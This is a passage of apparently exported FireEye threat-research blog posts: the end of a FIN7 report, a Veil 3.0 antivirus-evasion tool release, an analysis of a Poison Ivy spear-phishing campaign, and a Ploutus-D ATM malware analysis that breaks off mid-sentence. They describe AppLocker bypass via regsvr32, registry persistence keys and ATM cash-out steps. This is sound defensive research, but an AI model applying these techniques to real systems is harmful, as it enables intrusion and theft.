  attempts to either work for U.S.-based organizations or be U.S.-based
  representatives of organizations located elsewhere. However, it is
  possible that the attackers could perform similar activity mimicking
  other regulatory organizations in other countries.</p>
 <h5>
  <b>Implications</b></h5>
 <p>We have not yet identified FIN7’s ultimate goal in this campaign, as
  we have either blocked the delivery of the malicious emails or our
  FaaS team detected and contained the attack early enough in the
  lifecycle before we observed any data targeting or theft.  However, we
  surmise FIN7 can profit from compromised organizations in several
  ways. If the attackers are attempting to compromise persons involved
  in SEC filings due to their information access, they may ultimately be
  pursuing securities fraud or other investment abuse. Alternatively, if
  they are tailoring their social engineering to these individuals, but
  have other goals once they have established a foothold, they may
  intend to pursue one of many other fraud types.</p>
 <p>Previous FIN7 operations deployed multiple point-of-sale malware
  families for the purpose of collecting and exfiltrating sensitive
  financial data. The use of the CARBANAK malware in FIN7 operations
  also provides limited evidence that these campaigns are linked to
  previously observed CARBANAK operations leading to fraudulent banking
  transactions, ATM compromise, and other monetization schemes.</p>
 <h5>
  <b>Community Protection Event</b></h5>
 <p>FireEye implemented a Community Protection Event – FaaS, Mandiant,
  Intelligence, and Products – to secure all clients affected by this
  campaign. In this instance, an incident detected by FaaS led to the
  deployment of additional detections by the FireEye Labs team after
  FireEye Labs Advanced Reverse Engineering quickly analyzed the
  malware. Detections were then quickly deployed to the suite of FireEye products.</p>
 <p>The FireEye iSIGHT Intelligence MySIGHT Portal contains additional
  information based on our investigations of a variety of topics
  discussed in this post, including FIN7 and the POWERSOURCE and
  TEXTMATE malware. Click <a href=""https://www.fireeye.com/products/isight-intelligence.html"">here</a> for
  more information.</p>",http://www.fireeye.com/blog/threat-research/2017/03/fin7_spear_phishing.html
AntiVirus Evasion Reconstructed – Veil 3.0,"<p>The <a href=""https://www.veil-framework.com/"">Veil Framework</a> is a
  collection of tools designed for use during offensive security
  testing. When the time calls for it, <a href=""https://www.fireeye.com/content/fireeye-www/en_US/services/red-team-operations.html"" target=""_blank"">Mandiant’s Red Team</a> will use the Veil-Framework
  to help achieve their objective.  The most commonly used tool is
  Veil-Evasion, which can turn an arbitrary script or piece of shellcode
  into a Windows executable that will evade detections by common
  antivirus products.</p>
 <p>Veil 2.0 was made publicly available on June 17, 2013, and the core
  framework has remained largely unchanged since that date. There have
  been some modifications to the framework itself, but these have
  generally been minor in nature, with the majority of modifications
  involving the support of new programming languages and new payload modules.\</p>
 <p>After spending a few years developing in Python, I revisited the
  Veil codebase and identified parts of the backend framework that could
  be developed more efficiently. Six months later, after refactoring the
  codebase and adding a large number of updates, I am happy to present
    <a href=""https://github.com/Veil-Framework/Veil"">Veil 3.0</a>. The
  main menu is shown in Figure 1.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Anti%20Virus%20Evasion%20Truncer/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Veil 3 main menu</span></p>
 <h5>Python 3</h5>
 <p>First and foremost, one of the largest overhauls to Veil was
  updating the version of Python from Python 2 to Python 3. Python 2 is
  scheduled to reach end-of-life (EOL) in 2020, so it did not make much
  sense to spend time performing a large update to Veil in a language
  that will no longer be supported in three years.</p>
 <p>Updating Veil from Python 2 to Python 3 was easily the most
  time-consuming part of creating Veil 3. Running the <a href=""https://docs.python.org/2/library/2to3.html"">2to3 tool</a> was
  not an option; the conversion process required manual review for
  essentially all changes to Veil.</p>
 <p>One of the major differences when developing Veil in Python 3 vs.
  Python 2 is how shellcode is handled and modified. To illustrates this
  issue, Figure 2 shows a Python 2-based stager that includes encrypted
  shellcode to be decrypted at runtime.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Anti%20Virus%20Evasion%20Truncer/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: AES decrypting stager from Veil 2 in
    Python 2</span></p>
 <p>While the code in Figure 2 works in Python 2, it will not work in
  Python 3. Specifically, in Python 3, the shellcode no longer needs to
  be string escaped into a bytearray after decryption. The output of
  Python 3’s decryption is the original clear text data in a bytearray,
  which is immediately consumable by the rest of the script. Figure 3
  shows the Python 3 version of the same decryption stager.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Anti%20Virus%20Evasion%20Truncer/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: AES decrypting stager from Veil 3 in
    Python 3</span></p>
 <h5>Ordnance</h5>
 <p>Early versions of Veil relied on the Metasploit Framework's <a href=""https://github.com/rapid7/metasploit-framework/blob/master/msfvenom"">msfvenom</a>
  tool to generate shellcode for Veil payloads. After the initial
  release of Veil, however, this caused a problem. The output for
  msfvenom changed and it completely broke Veil's ability to process
  msfvenom output. After providing a patch to fix the issue, the Veil
  team decided that a different solution would be required instead of
  relying on a tool outside of our control.</p>
 <p>Thus, <a href=""https://github.com/Veil-Framework/Veil-Ordnance"">Veil-Ordnance</a>
  was developed and released in 2015. Veil-Ordnance is a tool that
  generates shellcode for use in Veil-Evasion stagers. Developing
  Veil-Ordnance had two main benefits:</p>
 <ol> <li>The Veil development team is in control of the output,
    preventing any future compatibility issues with Veil-Evasion.</li>
    <li>Shellcode generation is faster with Veil-Ordnance.</li> </ol>
 <p>Previously, Veil-Evasion and Veil-Ordnance were two separate tools.
  With the release of Veil 3.0, that is no longer the case, as shown in
  Figure 4.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Anti%20Virus%20Evasion%20Truncer/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4: Ordnance included in Veil 3.0</span></p>
 <p>Veil 3.0 users still have the ability to use msfvenom to generate
  their shellcode, but they now <b>also</b> have the option to use
  Ordnance. Ordnance will be able to immediately generate shellcode
  after users provide the IP and Port that the shellcode should connect
  to or listen on. Ordnance supports the most popular payload types:</p>
 <ol> <li>Reverse TCP</li> <li>Reverse HTTP</li> <li>Reverse HTTPS</li>
    <li>Reverse TCP DNS</li> <li>Reverse TCP All Ports</li> <li>Bind
  TCP</li> </ol>
 <p>This gives Veil users multiple options to choose from – they can
  stick with msfvenom, or use the new built-in tool, Ordnance.</p>
 <h5>Additional Languages</h5>
 <p>While Veil itself is written in Python, the processed payloads and
  output files can be in other programming languages. In Veil 3.0, two
  additional languages are now supported:</p>
 <ul> <li>AutoIt3</li> <li>Lua</li> </ul>
 <p>Lua payloads are only supported in a script format that must be
  compiled and run using a lua runtime, but Veil 3.0 running on Linux
  can compile AutoIt3 scripts into Windows executables. Veil 3.0 also
  supports the seven languages previously supported in version 2.0:</p>
 <ul> <li>Python</li> <li>PowerShell</li> <li>C</li> <li>C#</li>
  <li>Perl</li> <li>Ruby</li> <li>Golang</li> </ul>
 <h5>Environmental Detection</h5>
 <p>Another new feature in Veil 3.0 is the ability to check information
  about the system where the Veil payload is running. This feature is
  useful for ensuring that shellcode is only executed on target systems
  and during the engagement timeframe. The stager performs these checks
  and will only inject and execute the embedded shellcode if the
  specified conditions are met. Figure 5 shows the options for this feature.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Anti%20Virus%20Evasion%20Truncer/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: Environmental detection options</span></p>
 <p>Users can specify one or more of the following checks for Veil stagers:</p>
 <ul> <li>The domain that the victim machine must be joined to.</li>
    <li>A date that the payload expires on.</li> <li>The hostname of the
    system running the payload.</li> <li>The minimum number of
    processors on the system running the payload.</li> <li>The required
    username running the payload.</li> </ul>
 <p>If specifying more than one check, all checks must be met; otherwise
  the stager will cease execution without executing the shellcode.</p>
 <p>This covers the major updates with Veil 3.0's release. If you have
  any questions, or encounter an issue, please visit <a href=""https://github.com/Veil-Framework/Veil"">Veil's Github
  repository</a>. I hope that Veil can help further your assessments in
  the same way that it has helped us.</p>
 <p> </p>",http://www.fireeye.com/blog/threat-research/2017/03/_antivirus_evasionr.html
Spear Phishing Techniques Used in Attacks Targeting the Mongolian Government,"<h5>Introduction</h5>
 <p>FireEye recently observed a sophisticated campaign targeting
  individuals within the Mongolian government. Targeted individuals that
  enabled macros in a malicious Microsoft Word document may have been
  infected with <a href=""https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-poison-ivy.pdf"">Poison
  Ivy</a>, a popular remote access tool (RAT) that has been used for
  nearly a decade for key logging, screen and video capture, file
  transfers, password theft, system administration, traffic relaying,
  and more. The threat actors behind this attack demonstrated some
  interesting techniques, including:</p>
 <ol> <li>
    <b>Customized evasion based on victim profile</b> – The campaign
    used a publicly available technique to evade AppLocker application
    whitelisting applied to the targeted systems.</li> <li>
    <b>Fileless execution and persistence</b> – In targeted campaigns,
    threat actors often attempt to avoid writing an executable to the
    disk to avoid detection and forensic examination. The campaign we
    observed used four stages of PowerShell scripts without writing the
    the payloads to individual files.</li> <li>
    <b>Decoy documents</b> – This campaign used PowerShell to download
    benign documents from the Internet and launch them in a separate
    Microsoft Word instance to minimize user suspicion of malicious
  activity.</li> </ol>
 <h5>Attack Cycle</h5>
 <p>The threat actors used social engineering to convince users to run
  an embedded macro in a Microsoft Word document that launched a
  malicious PowerShell payload.</p>
 <p>The threat actors used two publicly available techniques, an
  AppLocker whitelisting bypass and a script to inject shellcode into
  the userinit.exe process. The malicious payload was spread across
  multiple PowerShell scripts, making its execution difficult to trace.
  Rather than being written to disk as individual script files, the
  PowerShell payloads were stored in the registry.   </p>
 <p>Figure 1 shows the stages of the payload execution from the
  malicious macro.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Spear%20Phishing%20Technique%20Ankit/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Stages of payload execution used in
    this attack</span></p>
 <h5>Social Engineering and Macro-PowerShell Level 1 Usage</h5>
 <p>Targets of the campaign received Microsoft Word documents via email
  that claimed to contain instructions for logging into webmail or
  information regarding a state law proposal.</p>
 <p>When a targeted user opens the malicious document, they are
  presented with the messages shown in Figure 2, asking them to enable macros.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Spear%20Phishing%20Technique%20Ankit/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: Lure suggesting the user to enable
    Macros to see content</span></p>
 <h5>Bypassing Application Whitelisting Script Protections (AppLocker)</h5>
 <p>Microsoft application whitelisting solution AppLocker prevents
  unknown executables from running on a system. In April 2016, a
  security researcher <a href=""https://github.com/subTee/SCTPersistence/blob/master/Backdoor.sct"">demonstrated
    a way to bypass</a> this using regsvr32.exe, a legitimate Microsoft
  executable permitted to execute in many AppLocker policies. The
  regsvr32.exe executable can be used to download a Windows Script
  Component file (SCT file) by passing the URL of the SCT file as an
  argument. This technique bypasses AppLocker restrictions and permits
  the execution of code within the SCT file.</p>
 <p>We observed implementation of this bypass in the macro code to
  invoke regsvr32.exe, along with a URL passed to it which was hosting a
  malicious SCT file, as seen in Figure 3.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Spear%20Phishing%20Technique%20Ankit/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3:  Command after de-obfuscation to
    bypass AppLocker via regsv32.exe</span></p>
 <p>Figure 4 shows the entire command line parameter used to bypass AppLocker.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Spear%20Phishing%20Technique%20Ankit/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4: Command line parameter used to bypass AppLocker</span></p>
 <p>We found that the malicious SCT file invokes WScript to launch
  PowerShell in hidden mode with an encoded command, as seen in Figure 5.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Spear%20Phishing%20Technique%20Ankit/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: Content of SCT file containing code to
    launch encoded PowerShell</span></p>
 <h5>Decoding SCT: Decoy launch and Stage Two PowerShell</h5>
 <p>After decoding the PowerShell command, we observed another layer of
  PowerShell instructions, which served two purposes:</p>
 <p>1.     There was code to download a decoy document from the Internet
  and open it in a second winword.exe process using the Start-Process
  cmdlet. When the victim enables macros, they will see the decoy
  document shown in Figure 6. This document contains the content
  described in the spear phishing email.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Spear%20Phishing%20Technique%20Ankit/Fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: Decoy downloaded and launched on the
    victim’s screen</span></p>
 <p>2.     After launching the decoy document in the second winword.exe
  process, the PowerShell script downloads and runs another PowerShell
  script named f0921.ps1 as shown in Figure 7.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Spear%20Phishing%20Technique%20Ankit/Fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7: PowerShell to download and run decoy
    decoy document and third-stage payload</span></p>
 <h5>Third Stage PowerShell Persistence</h5>
 <p>The third stage PowerShell script configures an encoded PowerShell
  command persistently as base64 string in the HKCU:
  \Console\FontSecurity registry key. Figure 8 shows a portion of the
  PowerShell commands for writing this value to the registry.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Spear%20Phishing%20Technique%20Ankit/Fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8: Code to set registry with encoded
    PowerShell script</span></p>
 <p>Figure 9 shows the registry value containing encoded PowerShell code
  set on the victims’ system.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Spear%20Phishing%20Technique%20Ankit/Fig9.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 9: Registry value containing encoded
    PowerShell script</span></p>
 <p>Figure 10 shows that using Start-Process, PowerShell decodes this
  registry and runs the malicious code.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Spear%20Phishing%20Technique%20Ankit/Fig10.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 10: Code to decode and run malicious
    content from registry</span></p>
 <p>The third stage PowerShell script also configures another registry
  value  named HKCU\CurrentVersion\Run\SecurityUpdate to launch the
  encoded PowerShell payload stored in the HKCU: \Console\FontSecurity
  key. Figure 11 shows the code for these actions. This will execute the
  PowerShell payload when the user logs in to the system.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Spear%20Phishing%20Technique%20Ankit/Fig11.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 11: PowerShell registry persistence</span></p>
 <h5>Fourth Stage PowerShell Inject-LocalShellCode</h5>
 <p>The HKCU\Console\FontSecurity registry contains the fourth stage
  PowerShell script, shown decoded in Figure 12. This script borrows
  from the publicly available Inject-LocalShellCode PowerShell script
  from <a href=""https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1"">PowerSploit</a>
  to inject shellcode.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Spear%20Phishing%20Technique%20Ankit/Fig12.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 12: Code to inject shellcode</span></p>
 <h5>Shellcode Analysis</h5>
 <p>The shellcode has a custom XOR based decryption loop that uses a
  single byte key (0xD4), as seen in Figure 13.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Spear%20Phishing%20Technique%20Ankit/Fig13.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 13: Decryption loop and call to decrypted shellcode</span></p>
 <p>After the shellcode is decrypted and run, it injects a Poison Ivy
  backdoor into the userinit.exe as shown in Figure 14.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Spear%20Phishing%20Technique%20Ankit/Fig14.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 14: Code injection in userinit.exe and
    attempt to access Poison Ivy related DAT files</span></p>
 <p>In the decrypted shellcode, we also observed content and
  configuration related to Poison Ivy.  Correlating these bytes to the
  standard configuration of Poison Ivy, we can observe the following:</p>
 <ul> <li>Active setup – StubPath</li> <li>Encryption/Decryption key -
  version2013</li> <li>Mutex name - 20160509                 </li> </ul>
 <p>The Poison Ivy configuration dump is shown in Figure 15.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Spear%20Phishing%20Technique%20Ankit/Fig15.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 15: Poison Ivy configuration dump</span></p>
 <h5>Conclusion</h5>
 <p>Although Poison Ivy has been a proven threat for some time, the
  delivery mechanism for this backdoor uses recent publicly available
  techniques that differ from previously observed campaigns. Through the
  use of PowerShell and publicly available security control bypasses and
  scripts, most steps in the attack are performed exclusively in memory
  and leave few forensic artifacts on a compromised host.</p>
 <p>FireEye HX Exploit Guard is a behavior-based solution that is not
  affected by the tricks used here. It detects and blocks this threat at
  the initial level of the attack cycle when the malicious macro
  attempts to invoke the first stage PowerShell payload. HX also
  contains generic detections for the registry persistence, AppLocker
  bypasses and subsequent stages of PowerShell abuse used in this attack.</p>",http://www.fireeye.com/blog/threat-research/2017/02/spear_phishing_techn.html
New Variant of Ploutus ATM Malware Observed in the Wild in Latin America,"<h4>Introduction</h4>
 <p>Ploutus is one of the most advanced ATM malware families we’ve seen
  in the last few years. Discovered for the <a href=""https://www.symantec.com/connect/blogs/criminals-hit-atm-jackpot"">first
    time in Mexico</a> back in 2013, Ploutus enabled criminals to empty
  ATMs using either an external keyboard attached to the machine or <a href=""https://www.symantec.com/connect/blogs/texting-atms-cash-shows-cybercriminals-increasing-sophistication"">via
    SMS message</a>, a technique that had never been seen before.</p>
 <p>FireEye Labs recently identified a previously unobserved version of
  Ploutus, dubbed Ploutus-D, that interacts with KAL’s Kalignite
  multivendor ATM platform. The samples we identified target the ATM
  vendor Diebold. However, minimal code change to Ploutus-D would
  greatly expand its ATM vendor targets since Kalignite Platform <a href=""http://www.kal.com/en/video/multi-vendor"">runs on 40 different
    ATM vendors in 80 countries</a>.</p>
 <p>Once deployed to an ATM, Ploutus-D makes it possible for a money
  mule to obtain thousands of dollars in minutes. A money mule must have
  a master key to open the top portion of the ATM (or be able to pick
  it), a physical keyboard to connect to the machine, and an activation
  code (provided by the boss in charge of the operation) in order to
  dispense money from the ATM. While there are some risks of the money
  mule being caught by cameras, the speed in which the operation is
  carried out minimizes the mule’s risk.</p>
 <p>This blog covers the changes, improvements, and Indicators of
  Compromise (IOC) of Ploutus-D in order to help financial organizations
  identify and defend against this threat.</p>
 <h4>Previously unobserved features of Ploutus-D</h4>
 <ul> <li>It uses the Kalignite multivendor ATM Platform.</li> <li>It
    could run on ATMs running the Windows 10, Windows 8, Windows 7 and
    XP operating systems.</li> <li>It is configured to control Diebold
  ATMs.</li> <li>It has a different GUI interface.</li> <li>It comes
    with a Launcher that attempts to identify and kill security
    monitoring processes to avoid detection.</li> <li>It uses a stronger
    .NET obfuscator called Reactor.</li> </ul>
 <h4>Commonality between Ploutus and Ploutus-D</h4>
 <ul> <li>The main purpose is to empty the ATM without requiring an ATM
  card.</li> <li>The attacker must interact with the malware using an
    external keyboard attached to the ATM.</li> <li>An activation code
    is generated by the attacker, which expires after 24 hours.</li>
    <li>Both were created in .NET.</li> <li>Can run as Windows Service
    or standalone application.</li> </ul>
 <h4>Dissecting Ploutus-D</h4>
 <p>Ploutus-D (observed in the wild with the filename of
  “AgilisConfigurationUtility.exe”) can run as a standalone application
  or as a Windows service started by a Launcher (observed in the wild as
  “Diebold.exe”). Although multiple functionality is shared between the
  two components, the main difference is that Ploutus-D is the component
  with the capability to dispense money.</p>
 <h5>Launcher – Diebold.exe (.NET)</h5>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""221""><p>MD5</p> </td> <td valign=""top"" width=""221""><p>C04A7CB926CCBF829D0A36A91EBF91BD</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>.NET Obfuscator</p> </td> <td valign=""top"" width=""221""><p>Reactor</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>File Size</p> </td> <td valign=""top"" width=""221""><p>198 kB</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>File Type</p> </td> <td valign=""top"" width=""221""><p>Win32 EXE</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>Time Stamp</p> </td> <td valign=""top"" width=""221""><p>2016:11:16 04:55:56-08:00</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>Code Size</p> </td> <td valign=""top"" width=""221""><p>199168</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>File Version</p> </td> <td valign=""top"" width=""221""><p>0.0.0.1</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>Internal Name</p> </td> <td valign=""top"" width=""221""><p>Diebold.exe</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>Legal Copyright</p> </td> <td valign=""top"" width=""221""><p>Copyright ©  2015</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>Original Filename</p> </td> <td valign=""top"" width=""221""><p>Diebold.exe</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>Product Name</p> </td> <td valign=""top"" width=""221""><p>Diebold</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>Product Version</p> </td> <td valign=""top"" width=""221""><p>0.0.0.1</p> </td> </tr></tbody></table>
 <p>
  <span class=""type-XS"">Table 1: Launcher Properties</span></p>
 <p>This time, the attackers put more effort into trying to obfuscate
  and protect their code from reverse engineering by switching from .NET
  Confuser to Reactor. A quick look at how the protected code appears is
  shown in Figure 1.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Code protected by Reactor</span></p>
 <h5>Inspecting the Launcher</h5>
 <p>Once the code is deobfuscated, it is easy to understand the internal
  workings. Before the Launcher execution starts, it will perform an
  integrity check on itself to make sure it has not been altered.</p>
 <p>The Launcher can receive different arguments in the command line to
  either install as a service, run Ploutus-D, or uninstall from the
  machine. The service properties can be seen in Figure 2.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: Service Description of the Launcher</span></p>
 <h5>Persistence</h5>
 <p>Using a very common persistence technique, the malware will add
  itself to the “Userinit” registry key to allow execution after every
  reboot. The key is located at:</p>
 <p>\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</p>
 <h5>Interacting with the Launcher</h5>
 <p>The attacker must interact with the Launcher by attaching a keyboard
  to the ATM USB or PS/2 port. Figure 3 below shows an example of this setup.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: Keyboard attached to the ATM port</span></p>
 <p>Once the Launcher has been installed in the ATM, it will perform
  keyboard hooking in order to read the instructions from the attackers
  via the external keyboard. A combination of “F” keys will be used to
  request the action to execute (see Figure 4).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4: Interacting with the Launcher via keyboard</span></p>
 <p>The main tasks supported are:</p>
 <ul> <li>Start programs on demand, some of which are decrypted from the
    resource section of the Launcher:<ul> <li>C:\Program
        Files\Diebold\Agilis Startup\AgilisShellStart.exe</li>
      <li>Main.exe</li> <li>XFSConsole.exe</li> </ul> </li> <li>Kill
      Processes:<ul> <li>NHOSTSVC.exe</li>
      <li>AgilisConfigurationUtility.exe</li> <li>XFSConsole.exe</li>
    </ul> </li> <li>Delete Files:<ul> <li>NetOp.LOG – Secure Remote
        Management solution</li> </ul> </li> <li>Reboot Machine:<ul>
        <li>“wmic os where Primary='TRUE' reboot”</li> </ul> </li> </ul>
 <p>As seen in Figure 5, a request has been sent to run Ploutus-D
  (AgilisConfigurationUtility.exe) from command line.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: Starting Ploutus-D by the Launcher</span></p>
 <p>Legitimate KAL ATM software is dropped into the system along with
  Ploutus-D, as shown in the Figure 6. The reason for this is to make
  sure that all the software and versions needed to properly run the
  malware are present in the same folder to avoid any dependency issues.
  The same technique was also used by the first version of Ploutus.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig6.PNG"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: Dropped files by the Launcher</span></p>
 <p>The K3A.Platform.dll DLL will load the Kalignite Platform to allow
  Ploutus-D to control the ATM.</p>
 <p>This shows that the attackers likely have access to the targeted ATM
  software. They can either buy physical ATMs from authorized resellers,
  which come preloaded with vendor software, or they could just steal
  the ATMs directly from the bank’s facility. An example of a real
  incident reported in Mexico is shown in Figure 7.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig7.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 7: Attackers physically stealing ATMs</span></p>
 <h5>Ploutus-D – AgilisConfigurationUtility.exe (.NET)</h5>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""221""><p>MD5</p> </td> <td valign=""top"" width=""221""><p>5AF1F92832378772A7E3B07A0CAD4FC5</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>.NET Obfuscator</p> </td> <td valign=""top"" width=""221""><p>Reactor</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>File Size</p> </td> <td valign=""top"" width=""221""><p>274 kB</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>File Type</p> </td> <td valign=""top"" width=""221""><p>Win32 EXE</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>Time Stamp</p> </td> <td valign=""top"" width=""221""><p>1992:06:19 15:22:17-07:00</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>Code Size</p> </td> <td valign=""top"" width=""221""><p>29696</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>OS Version</p> </td> <td valign=""top"" width=""221""><p>4.0</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>Image Version</p> </td> <td valign=""top"" width=""221""><p>0.0</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>Subsystem Version</p> </td> <td valign=""top"" width=""221""><p>4.0</p> </td> </tr></tbody></table>
 <p>
  <span class=""type-XS"">Table 2: Ploutus-D Properties</span></p>
 <p>Similar to the Launcher, this binary also came protected with
  Reactor obfuscator (see Figure 8).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8. Protected with Reactor</span></p>
 <p>Looking at the unprotected code (see Figure 9), the connection with
  Ploutus became evident since the names of most of the functions are
  the same as in the first version.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig9.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 9: Unprotected code</span></p>
 <p>Ploutus-D will make sure a mutex with the name “KaligniteAPP” does
  not exist in the system in order to start running. Similar to the
  Launcher, Ploutus-D will hook the keyboard in order for the attackers
  to interact with it; however, apart from receiving commands from “F”
  keys, it will also read from the numeric pad (numbers).</p>
 <p>Similar to the previous version, the GUI will be enabled by entering
  a combination of “F” keys. Then, a valid 8-digit code must be entered
  in the GUI in order to be able to dispense money. Ploutus-D also
  allows the attackers to enter the amount to withdraw (billUnits – 4
  digits) and the number of cycles (billCount – 2 digits) to repeat the
  dispensing operation (see Figure 10).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig10.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 10: Parsing amount and cycles</span></p>
 <p>The Ploutus-D GUI is displayed in Figure 11. It is configured to
  list properties of 18 cassettes (C1-C18). Letter “D” shows the status
  of the cassette and “CV” is a value taken from the registry. The
  message “Estado:Activado”, which means “State: Activated”, is
  displayed if a valid code has been entered. The ATM ID and HW_ID are
  unique to the ATM. The amount to be retrieved is displayed as:
  “Cantidad: 500” (default value if no amount entered in the GUI). The
  total amount depends on the currency, which is also calculated by the malware.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig11.PNG"" /></p>
 <p>
  <span class=""type-XS"">Figure 11: Ploutus-D GUI enabled</span></p>
 <p>All the actions are logged into a file with the name “Log.txt”. An
  extract can be seen in Figure 12.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig12.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 12: Log File recording actions</span></p>
 <h4>Dispensing the Money</h4>
 <p>In order for the mule to be able to start dispensing money, a valid
  8-digit code must be entered. This code is provided by the boss in
  charge of the operation and is calculated based on a unique ID
  generated per ATM, and the current month and day of the attack.</p>
 <p>Once a valid activation code has been entered (which expires in 24
  hours), the dispensing process will start by pressing “F3” from the
  external keyboard.</p>
 <p>The malware will first identify the cassette’s denomination by
  querying the registry denomination table from Diebold Dispenser
  Logical Name “DBD_AdvFuncDisp” at:</p>
